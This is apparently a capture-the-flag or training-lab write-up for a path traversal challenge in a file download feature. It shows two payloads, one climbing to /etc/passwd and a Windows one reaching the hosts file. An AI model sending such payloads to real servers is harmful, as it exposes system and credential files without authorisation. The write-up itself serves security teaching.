# 05 - Path Traversal

## Objective
Access files outside the web root directory.

## Vulnerability Location
File download/viewer functionality

## Exploitation

### Basic Path Traversal

```
/download?file=../../../../etc/passwd
```

### Windows Variants

```
/download?file=..\..\..\windows\system32\drivers\etc\hosts
```

## Flag

Read sensitive system files to find the flag.
